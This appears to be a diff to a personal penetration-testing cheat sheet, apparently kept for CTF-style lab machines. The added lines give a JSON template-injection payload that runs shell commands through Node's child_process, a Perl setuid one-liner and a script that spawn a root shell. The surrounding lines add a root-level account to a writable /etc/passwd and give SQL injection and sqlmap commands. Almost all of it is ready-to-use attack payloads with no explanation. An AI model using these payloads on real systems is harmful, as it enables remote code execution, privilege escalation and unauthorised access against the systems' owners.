@@ -132,6 +132,9 @@ sessions -i 1
 ps
 migrate 1828
 
+JSON SSTI POST request (replace email by the right param)
+{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"}
+
 WRITABLE /etc/passwd
 echo "toor1:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash" >> /etc/passwd 
 Credentials "toor1/foo"
@@ -160,6 +163,15 @@ SQL INJECTIONS
 admin' or '1' = '1
 Copy to file login request from Burp name it "req"
 sqlmap -r req --risk=3 --level=3 --batch --force-ssl
+
+PERL SUID oneliner
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "id";'
+
+PERL SUID script
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/bash";
 
 SMB
 smbclient -N -L \\\\10.10.10.27\\
